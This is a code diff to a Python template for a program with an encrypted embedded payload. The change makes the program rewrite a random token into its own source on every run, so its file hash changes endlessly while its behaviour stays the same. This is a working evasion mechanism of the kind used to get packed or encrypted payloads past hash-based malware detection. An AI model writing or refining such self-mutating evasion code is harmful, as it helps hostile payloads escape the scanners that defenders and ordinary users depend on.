@@ -18,6 +18,8 @@ payload embedded in it.
 
 import base64
 import os
+import re
+import secrets
 import sys
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -33,8 +35,10 @@ MUTATION_TOKEN = "{mutation_token}"
 def _update_signature():
     """Rewrite this program's own MUTATION_TOKEN, changing its file hash.
 
-    The program replaces its mutation token with a fresh value and saves
-    itself, so its SHA-256 changes while its behaviour stays identical.
+    A freshly generated random token is written on **every** run, so the file's
+    SHA-256 keeps changing indefinitely while the program's behaviour stays
+    identical. The token line is located with a regex, so the new value never
+    has to match a value baked in at generation time.
     """
 
     path = os.path.abspath(__file__)
@@ -45,15 +49,20 @@ def _update_signature():
     except OSError:
         return False
 
-    old = {old_mutation_line}
-    new = {new_mutation_line}
+    fresh_token = secrets.token_hex(16)
+    new_source, count = re.subn(
+        r'MUTATION_TOKEN = "[0-9a-f]*"',
+        'MUTATION_TOKEN = "' + fresh_token + '"',
+        source,
+        count=1,
+    )
 
-    if old not in source:
+    if count == 0:
         return False
 
     try:
         with open(path, "w", encoding="utf-8") as handle:
-            handle.write(source.replace(old, new, 1))
+            handle.write(new_source)
     except OSError:
         return False
 
